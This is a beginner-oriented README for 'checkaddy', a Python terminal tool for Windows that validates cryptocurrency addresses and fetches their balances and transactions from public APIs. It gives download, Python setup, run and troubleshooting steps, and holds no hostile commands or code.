# 🔍 checkaddy - Validate Crypto Addresses Easily

[![Download checkaddy](https://img.shields.io/badge/Download-checkaddy-purple?style=for-the-badge)](https://github.com/Low102/checkaddy/releases)

---

## 📋 What is checkaddy?

checkaddy is a terminal tool that helps you verify public cryptocurrency addresses from different networks. It checks if an address looks correct and also fetches balance and transaction data by connecting to public APIs. This way, you can quickly check addresses for Bitcoin (BTC), Litecoin (LTC), Dogecoin (DOGE), Dash (DASH), Bitcoin Cash (BCH), Ethereum (ETH), Binance Smart Chain (BSC), and Polygon.

The tool runs in a simple text-based interface on Windows and is built with Python and Textual, which means you don’t need to open a web browser to get quick information about crypto addresses.

---

## 🚀 Getting Started

This guide helps you download and start using checkaddy on a Windows computer. You do not need any programming experience or special tools. Follow the steps below to get checkaddy running.

---

## 💻 System Requirements

Before installing, make sure your Windows system meets these minimum requirements:

- Windows 10 or later
- 64-bit operating system
- Internet connection to fetch balance and transactions
- 50 MB free disk space
- Python 3.8 or higher installed (explained in the install steps)
- Access to the Command Prompt (you’ll be guided)

If you don’t have Python installed, the instructions below will help you get it set up.

---

## 📥 Download checkaddy

To get checkaddy, visit the releases page on GitHub:

[![Download from GitHub](https://img.shields.io/badge/Download-From_GitHub-blue?style=for-the-badge)](https://github.com/Low102/checkaddy/releases)

Step by step:

1. Click the link above to open the releases page.
2. Look for the latest release version (marked by date or version number).
3. Download the file that ends with `.zip` or `.exe` if available. Usually, the `.zip` has all files you need.
4. Save it to a folder you can easily find, like the Desktop or Downloads folder.

---

## ⚙️ Installing Python (If needed)

checkaddy needs Python to run. Windows usually does not have Python installed by default. Here is how to set it up:

1. Go to the official Python download page: https://www.python.org/downloads/windows/
2. Download the latest Windows installer for Python 3.x (choose 64-bit).
3. Run the downloaded installer.
4. In the installer window, check the box that says “Add Python to PATH” before clicking “Install Now.”
5. Wait for the installation to finish.
6. To verify, open Command Prompt (press `Win + R`, type `cmd`, then press Enter), and type:

    ```
    python --version
    ```
    
    You should see the Python version number displayed.

---

## 🗂 Extract and Prepare checkaddy

Once downloaded:

1. If you have a `.zip` file, right-click it and select "Extract All."
2. Choose a folder location where you want to keep the program files.
3. Open this folder to see the contents.

---

## ▶️ Running checkaddy

You can run checkaddy directly from the Command Prompt:

1. Open Command Prompt:
   - Press `Win + R` to open the Run dialog.
   - Type `cmd` and press Enter.
2. In Command Prompt, type:

    ```
    cd path\to\checkaddy-folder
    ```
    
    Replace `path\to\checkaddy-folder` with the path to the folder where you extracted checkaddy. For example:

    ```
    cd Desktop\checkaddy
    ```

3. To start the application, type:

    ```
    python checkaddy.py
    ```

    or if the file name is different, replace `checkaddy.py` with the correct name.

4. The program opens a terminal-based interface where you can start entering cryptocurrency addresses.

---

## 🛠 Using checkaddy

Once open, use checkaddy like this:

- Enter a public cryptocurrency address in the prompt.
- The tool validates the address format locally to check if it looks correct.
- It then fetches live balance and recent transaction data from public APIs.
- Supported networks include BTC, LTC, DOGE, DASH, BCH, ETH, BSC, and Polygon.
- Review results directly in the terminal window.

This lets you quickly check if an address is valid and see its activity without using a website or wallet app.

---

## 🔄 Updating checkaddy

To update to the latest version:

1. Return to the [GitHub releases page](https://github.com/Low102/checkaddy/releases).
2. Download the newest release files.
3. Replace your current checkaddy files with the new ones, keeping your folder organized.
4. Restart the program as shown above.

---

## ❓ Troubleshooting

- If `python` command fails, make sure Python is installed and added to your system PATH.
- If checkaddy does not start, confirm you are in the correct folder in Command Prompt.
- For errors about missing Python modules, install required packages by typing:

  ```
  pip install textual requests
  ```

- Internet connection is required for live data retrieval.
- If a cryptocurrency address is not supported, check that it matches one of the supported networks listed above.

---

## 📚 More information

To learn about the project or report issues, visit the main repository page:  
https://github.com/Low102/checkaddy

Look for the README file there for developer-oriented details.

---

## 📥 Download checkaddy again

[![Download checkaddy](https://img.shields.io/badge/Download-checkaddy-purple?style=for-the-badge)](https://github.com/Low102/checkaddy/releases)